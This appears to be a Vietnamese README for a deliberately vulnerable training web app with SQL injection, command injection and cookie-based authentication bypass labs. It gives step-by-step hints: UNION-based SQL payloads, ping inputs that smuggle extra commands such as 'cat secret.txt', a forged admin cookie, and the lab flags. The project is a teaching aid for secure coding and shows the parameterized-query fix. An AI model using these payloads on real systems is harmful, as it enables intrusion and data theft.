                                                                                                                                                                                # 🔐 Security Lab - Web Security Practice

Dự án web để thực hành các kỹ thuật bảo mật và tấn công web trong môi trường kiểm soát.

## 📋 Tính năng

-   **Trang chủ**: Hiển thị danh sách các lab bảo mật
-   **SQL Injection Lab** (`/lab/sqli`): Thực hành kỹ thuật tấn công SQL Injection
    -   Hiển thị tất cả title từ bảng posts ngay khi vào trang
    -   Thanh tìm kiếm bài viết theo tiêu đề
    -   Query SQL không được filter (có lỗ hổng cố tình)
    -   Hiển thị query SQL đang thực thi
    -   Gợi ý và hướng dẫn khai thác
-   **Command Injection Lab** (`/lab/cmdi`): Thực hành kỹ thuật Command Injection
    -   Công cụ ping network
    -   Command không được filter (có lỗ hổng cố tình)
    -   Hiển thị command đang thực thi
    -   File bí mật để khai thác
    -   Gợi ý và hướng dẫn phòng chống
-   **Authentication Bypass Lab** (`/lab/auth`): Thực hành kỹ thuật vượt qua xác thực
    -   Hệ thống login với cookie
    -   Cookie lưu username:password không an toàn
    -   Bảng tin comments với Stored XSS
    -   Bypass để đăng nhập admin
    -   Session Hijacking với XSS
    -   **🌐 Chrome Auto-Login**: Tự động mở Chrome để đăng nhập admin khi phát hiện XSS
    -   Gợi ý và hướng dẫn bảo mật

## 🗄️ Cấu trúc Database

### Bảng `posts`

```sql
- id (INTEGER PRIMARY KEY)
- title (TEXT)
- content (TEXT)
```

### Bảng `users`

```sql
- id (INTEGER PRIMARY KEY)
- username (TEXT)
- password (TEXT)
- email (TEXT)
```

### Bảng `secret`

```sql
- id (INTEGER PRIMARY KEY)
- flag (TEXT)
- description (TEXT)
```

## 🚀 Cài đặt và Chạy

### 1. Cài đặt dependencies

```bash
npm install
```

### 2. Chạy server

```bash
npm start
```

Hoặc chế độ development với auto-reload:

```bash
npm run dev
```

### 3. Truy cập ứng dụng

Mở trình duyệt và truy cập: `http://localhost:3000`

## 🎯 Hướng dẫn SQL Injection Lab

### Mục tiêu

1. Phát hiện lỗ hổng SQL Injection trong chức năng tìm kiếm
2. Khai thác để lấy thông tin từ các bảng khác
3. Tìm flag bí mật trong bảng `secret`

### Gợi ý

**Level 1 - Phát hiện lỗ hổng:**

```
Thử nhập: '
Nếu báo lỗi SQL => có lỗ hổng
```

**Level 2 - Xác định số cột:**

```
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--  (sẽ lỗi vì chỉ có 2 cột)
```

**Level 3 - Union-based SQL Injection:**

```
' UNION SELECT 1, 2--
```

**Level 4 - Khám phá các bảng:**

```
' UNION SELECT 1, name FROM sqlite_master WHERE type='table'--
```

**Level 5 - Lấy flag:**

```
' UNION SELECT id, flag FROM secret--
```

## 🎯 Hướng dẫn Command Injection Lab

### Truy cập

`http://localhost:3000/lab/cmdi`

### Mục tiêu

1. Test công cụ ping với IP/domain hợp lệ
2. Phát hiện lỗ hổng Command Injection
3. Khai thác để thực thi lệnh hệ thống
4. Đọc file bí mật `secret.txt` và lấy FLAG

### Gợi ý

**Level 1 - Test bình thường:**

```
8.8.8.8
```

**Level 2 - Phát hiện lỗ hổng:**

```
8.8.8.8; whoami
```

**Level 3 - Liệt kê file:**

```
8.8.8.8; ls -la
```

**Level 4 - Lấy FLAG:**

```
8.8.8.8; cat secret.txt
```

**FLAG:** `FLAG{C0mm4nd_1nj3ct10n_M4st3r_2024}`

**Hướng dẫn chi tiết:** Xem file `CMDI-GUIDE.md`

## 🎯 Hướng dẫn Authentication Bypass Lab

### Truy cập

`http://localhost:3000/lab/auth`

### Mục tiêu

1. Đăng nhập với tài khoản user bình thường
2. Phát hiện lỗ hổng cookie không an toàn
3. Bypass authentication để đăng nhập admin
4. Đọc comment bí mật và lấy FLAG

### Gợi ý

**Level 1 - Đăng nhập bình thường:**

```
user1 / password1
```

**Level 2 - Kiểm tra cookie:**

DevTools (F12) → Application → Cookies → Xem cookie `auth`

**Level 3 - Phát hiện lỗ hổng:**

Cookie có dạng: `username:password` (plaintext!)

**Level 4 - Bypass authentication:**

Sửa cookie thành: `admin:admin123`

**Level 5 - Lấy FLAG:**

Xem comment của admin trong bảng tin

**FLAG:** `FLAG{4uth_Byp4ss_C00k13_H4ck}`

**Hướng dẫn chi tiết:** Xem file `AUTH-GUIDE.md`

**Kỹ thuật nâng cao:** Xem file `XSS-DEMO.md` để học cách kết hợp XSS với Session Hijacking

**🌐 Chrome Auto-Login:** Xem file `CHROME-AUTO-GUIDE.md` để học về tính năng tự động mở Chrome

## ⚠️ Lưu ý Bảo mật

-   Dự án này được thiết kế **CÓ LỖ HỔNG** cho mục đích học tập
-   **KHÔNG** sử dụng code này trong môi trường production
-   Chỉ sử dụng cho mục đích nghiên cứu và học tập
-   Query SQL không được sanitize hoặc validate

## 🛠️ Tech Stack

-   **Backend**: Node.js + Express
-   **Database**: SQLite3
-   **Template Engine**: EJS
-   **Frontend**: HTML, CSS, Vanilla JavaScript

## 📝 Cấu trúc Dự án

```
lelel/
├── server.js              # File server chính
├── package.json           # Dependencies
├── lab.db                 # SQLite database (tự động tạo)
├── views/
│   ├── index.ejs         # Trang chủ
│   └── sqli-lab.ejs      # Trang SQL Injection Lab
└── public/
    └── css/
        └── style.css     # Stylesheet
```

## 🎓 Mục đích Giáo dục

Dự án này giúp:

-   Hiểu cách hoạt động của SQL Injection
-   Nhận biết code không an toàn
-   Học cách khai thác lỗ hổng bảo mật
-   Áp dụng kiến thức để viết code an toàn hơn

## 🔒 Code An toàn

Để viết code an toàn, **LUÔN** sử dụng Prepared Statements:

```javascript
// ❌ KHÔNG AN TOÀN (như trong lab)
const query = `SELECT * FROM posts WHERE title LIKE '%${searchTerm}%'`;

// ✅ AN TOÀN (sử dụng parameterized query)
const query = `SELECT * FROM posts WHERE title LIKE ?`;
db.all(query, [`%${searchTerm}%`], callback);
```

---

Made for educational purposes 🎓
